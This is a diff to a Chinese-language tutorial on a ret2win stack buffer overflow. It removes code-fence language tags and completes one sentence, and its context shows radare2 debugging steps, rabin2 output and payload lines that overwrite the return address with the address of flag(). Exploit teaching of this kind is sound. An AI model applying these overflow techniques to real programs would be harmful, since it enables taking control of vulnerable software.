@@ -77,7 +77,7 @@ EIP 寄存器 并不位于栈上，因此不会被直接覆盖。
 
 现在我们需要在二进制文件中找到 `flag()` 函数的地址，这很简单：
 
-```bash
+```
 $ r2 -d -A ./vuln
 $ afl
 [...]
@@ -172,14 +172,14 @@ log.info(p.clean())
 
 现在让我们使用 `python3 exp.py` 运行该脚本，然后打开一个新的终端，输入：
 
-```bash
+```
 $ r2 -d -A $(pidof vuln)
 ```
 
 通过提供进程的 PID，radare2 可以 hook 它。让我们在 `unsafe()` 返回时中断并读取
 返回指针的值。
 
-```bash
+```
 [0xf7ef9fd0]> s main; pdf
 [0x080491ab]> s sym.unsafe; pdf
 [0x08049172]> db 0x080491aa
@@ -203,7 +203,7 @@ INFO: hit breakpoint at: 0x80491aa
 
 `radare2` 附带了一个名为 `rabin2` 的工具，用于二进制分析：
 
-```bash
+```
 $ rabin2 -I ./vuln
 [...]
 endian   little
@@ -222,7 +222,7 @@ payload += '\x08\x04\x91\xc3'[::-1]
 
 如果你现在运行它，它将起作用：
 
-```bash
+```
 $ python3 exp.py
 [+] Starting local process './vuln': pid 143985
 [*] Overflow me
@@ -254,7 +254,7 @@ payload += p32(0x080491c3)
 payload = b'A' * 52 # 注意 "b"
 ```
 
-否则你会得到一个
+否则你会得到一个这样的报错：
 
 ```
 TypeError: can only concatenate str (not "bytes") to str
